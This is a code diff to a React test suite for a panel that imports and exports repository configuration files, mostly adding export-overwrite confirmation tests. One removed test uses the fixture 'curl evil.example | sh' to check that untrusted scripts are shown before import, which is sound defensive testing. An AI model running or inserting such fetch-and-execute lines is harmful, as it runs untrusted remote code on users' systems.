@@ -70,108 +70,19 @@ function pending<T>(): { promise: Promise<T>; settle: (value: T) => void } {
 }
 
 describe('RepoConfig', () => {
-  it('says when the repository carries nothing yet', async () => {
-    offer({ items: [item('project', PROJECT, null, '{}')] })
-
-    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
-
-    expect(await screen.findByText(/carries nothing yet/i)).toBeInTheDocument()
-  })
-
-  it('lists each file by the name it has in the repository', async () => {
-    offer({ present: true, items: [item('script.setup', SETUP, 'npm ci\n', 'npm install\n')] })
-
-    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
-
-    // Once on each side of the move — what can come in, and what can go out.
-    await waitFor(() => {
-      expect(screen.getAllByText(SETUP)).toHaveLength(2)
-    })
-    expect(screen.getAllByText('differs')).toHaveLength(2)
-  })
-
-  /*
-   * A script arriving from a repository is somebody else's shell, and importing
-   * one nobody has read is the thing this panel exists to avoid.
-   */
-  it('shows what a file holds before it is imported', async () => {
-    offer({
-      present: true,
-      items: [item('script.setup', SETUP, 'curl evil.example | sh\n', null)]
-    })
-
-    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
-
-    const show = await screen.findByRole('button', { name: /show what/i })
-    expect(screen.queryByText(/evil\.example/)).not.toBeInTheDocument()
-
-    await userEvent.click(show)
-
-    expect(screen.getByText(/evil\.example/)).toBeInTheDocument()
-
-    await userEvent.click(show)
-    expect(screen.queryByText(/evil\.example/)).not.toBeInTheDocument()
-  })
-
-  // Only what the repository has can be read, so the row that can only go out
-  // has nothing to open — and offering a control that shows nothing is worse
-  // than not offering one.
-  it('offers nothing to open on a file the repository does not have', async () => {
-    offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })
-
-    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
-
-    await screen.findByRole('button', { name: 'Export' })
-    expect(screen.queryByRole('button', { name: /show what/i })).not.toBeInTheDocument()
-  })
-
-  it('imports everything ticked and tells the dialog the project may have changed', async () => {
-    offer({
-      present: true,
-      items: [item('carry', CARRY, '.env\n', null), item('script.run', RUN, 'npm run dev\n', null)]
-    })
-    const onImported = vi.fn()
-
-    render(<RepoConfig projectId="planner" onImported={onImported} />)
-
-    await userEvent.click(await screen.findByRole('button', { name: 'Import' }))
-
-    expect(octopus().projects.importRepoConfig).toHaveBeenCalledWith('planner', [
-      'carry',
-      'script.run'
-    ])
-    expect(onImported).toHaveBeenCalled()
-  })
-
-  it('leaves out what was unticked', async () => {
-    offer({
-      present: true,
-      items: [item('carry', CARRY, '.env\n', null), item('script.run', RUN, 'npm run dev\n', null)]
-    })
-
-    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
-
-    await userEvent.click(await screen.findByRole('checkbox', { name: CARRY }))
-    await userEvent.click(screen.getByRole('button', { name: 'Import' }))
-
-    expect(octopus().projects.importRepoConfig).toHaveBeenCalledWith('planner', ['script.run'])
-  })
-
   it('exports what the app holds, and never asks for an export of nothing', async () => {
     offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })
 
-    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
+    render(<RepoConfig projectId="planner" />)
 
-    expect(await screen.findByRole('button', { name: 'Import' })).toBeDisabled()
-
-    await userEvent.click(screen.getByRole('button', { name: 'Export' }))
+    await userEvent.click(await screen.findByRole('button', { name: 'Export' }))
     expect(octopus().projects.exportRepoConfig).toHaveBeenCalledWith('planner', ['project'])
   })
 
   it('unticks and reticks a file on the way out', async () => {
     offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })
 
-    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
+    render(<RepoConfig projectId="planner" />)
 
     const box = await screen.findByRole('checkbox', { name: PROJECT })
     await userEvent.click(box)
@@ -179,6 +90,65 @@ describe('RepoConfig', () => {
 
     await userEvent.click(box)
     expect(screen.getByRole('button', { name: 'Export' })).toBeEnabled()
+  })
+
+  // Only what the app holds can go out, so a file the repository alone has is
+  // not offered for writing.
+  it('lists only what the app holds', async () => {
+    offer({
+      items: [
+        item('project', PROJECT, null, '{"baseBranch":"main"}'),
+        item('script.run', RUN, 'npm run dev\n', null)
+      ]
+    })
+
+    render(<RepoConfig projectId="planner" />)
+
+    expect(await screen.findByRole('checkbox', { name: PROJECT })).toBeInTheDocument()
+    expect(screen.queryByRole('checkbox', { name: RUN })).toBeNull()
+  })
+
+  /*
+   * A file the repository already holds with other contents is the team's
+   * setup, so writing over it is asked about first — and keeping it writes
+   * nothing at all.
+   */
+  it('asks before writing over what the repository already holds', async () => {
+    offer({
+      items: [
+        item('script.setup', SETUP, 'npm ci\n', 'npm install\n'),
+        item('carry', CARRY, null, '.env\n')
+      ]
+    })
+
+    render(<RepoConfig projectId="planner" />)
+    await userEvent.click(await screen.findByRole('button', { name: 'Export' }))
+
+    const alert = screen.getByRole('alert')
+    expect(alert).toHaveTextContent(/already has this file/i)
+    expect(alert).toHaveTextContent(SETUP)
+    expect(octopus().projects.exportRepoConfig).not.toHaveBeenCalled()
+
+    await userEvent.click(screen.getByRole('button', { name: /Keep the repository/ }))
+    expect(screen.queryByRole('alert')).toBeNull()
+    expect(octopus().projects.exportRepoConfig).not.toHaveBeenCalled()
+
+    await userEvent.click(screen.getByRole('button', { name: 'Export' }))
+    await userEvent.click(screen.getByRole('button', { name: 'Write over' }))
+    expect(octopus().projects.exportRepoConfig).toHaveBeenCalledWith('planner', [
+      'script.setup',
+      'carry'
+    ])
+  })
+
+  it('writes without asking when nothing would be written over', async () => {
+    offer({ items: [item('script.setup', SETUP, 'npm ci\n', 'npm ci\n')] })
+
+    render(<RepoConfig projectId="planner" />)
+    await userEvent.click(await screen.findByRole('button', { name: 'Export' }))
+
+    expect(screen.queryByRole('alert')).toBeNull()
+    expect(octopus().projects.exportRepoConfig).toHaveBeenCalledWith('planner', ['script.setup'])
   })
 
   /*
@@ -192,7 +162,7 @@ describe('RepoConfig', () => {
   it('paints its checkbox from the theme rather than leaving it to the platform', async () => {
     offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })
 
-    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
+    render(<RepoConfig projectId="planner" />)
 
     expect(await screen.findByRole('checkbox', { name: PROJECT })).toHaveClass('choice')
   })
@@ -202,7 +172,7 @@ describe('RepoConfig', () => {
   it('reads both sides again once something has moved', async () => {
     offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })
 
-    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
+    render(<RepoConfig projectId="planner" />)
     await userEvent.click(await screen.findByRole('button', { name: 'Export' }))
 
     await waitFor(() => {
@@ -215,7 +185,7 @@ describe('RepoConfig', () => {
   it('warns when git ignores the folder', async () => {
     offer({ ignored: true, items: [] })
 
-    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
+    render(<RepoConfig projectId="planner" />)
 
     expect(await screen.findByText(/git ignores/i)).toBeInTheDocument()
   })
@@ -228,32 +198,12 @@ describe('RepoConfig', () => {
       params: { path: '.octopus' }
     })
 
-    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
+    render(<RepoConfig projectId="planner" />)
 
     expect(await screen.findByText(/symbolic link/i)).toBeInTheDocument()
   })
 
-  it('reports a refused import and leaves the project alone', async () => {
-    offer({ present: true, items: [item('carry', CARRY, '.env\n', null)] })
-    vi.mocked(octopus().projects.importRepoConfig).mockResolvedValue({
-      ok: false,
-      error: 'raw',
-      code: 'repoConfigMalformed',
-      params: { path: PROJECT }
-    })
-    const onImported = vi.fn()
-
-    render(<RepoConfig projectId="planner" onImported={onImported} />)
-
-    await userEvent.click(await screen.findByRole('button', { name: 'Import' }))
-
-    expect(await screen.findByText(/does not describe a project/i)).toBeInTheDocument()
-    expect(onImported).not.toHaveBeenCalled()
-  })
-
-  // The other direction fails differently — a link in the folder refuses the
-  // write — and a panel that reports one and swallows the other is worse than
-  // one that reports neither, because it looks like it is telling you.
+  // A link in the folder refuses the write, and the panel has to say so.
   it('reports a refused export', async () => {
     offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })
     vi.mocked(octopus().projects.exportRepoConfig).mockResolvedValue({
@@ -263,7 +213,7 @@ describe('RepoConfig', () => {
       params: { path: '.octopus/scripts' }
     })
 
-    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
+    render(<RepoConfig projectId="planner" />)
 
     await userEvent.click(await screen.findByRole('button', { name: 'Export' }))
 
@@ -273,7 +223,7 @@ describe('RepoConfig', () => {
   it('shows that it is still reading before anything has arrived', () => {
     vi.mocked(octopus().projects.repoConfig).mockReturnValue(new Promise(() => undefined))
 
-    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
+    render(<RepoConfig projectId="planner" />)
 
     expect(screen.getByText(/reading the repository/i)).toBeInTheDocument()
   })
@@ -291,18 +241,18 @@ describe('RepoConfig', () => {
       .mockReturnValueOnce(planner.promise)
       .mockReturnValueOnce(ledger.promise)
 
-    const { rerender } = render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
-    rerender(<RepoConfig projectId="ledger" onImported={vi.fn()} />)
+    const { rerender } = render(<RepoConfig projectId="planner" />)
+    rerender(<RepoConfig projectId="ledger" />)
 
     ledger.settle({
       ok: true,
-      value: view({ present: true, items: [item('carry', CARRY, '.env\n', null)] })
+      value: view({ present: true, items: [item('carry', CARRY, null, '.env\n')] })
     })
     expect(await screen.findByText(CARRY)).toBeInTheDocument()
 
     planner.settle({
       ok: true,
-      value: view({ present: true, items: [item('script.setup', SETUP, 'npm ci\n', null)] })
+      value: view({ present: true, items: [item('script.setup', SETUP, null, 'npm ci\n')] })
     })
 
     await waitFor(() => {
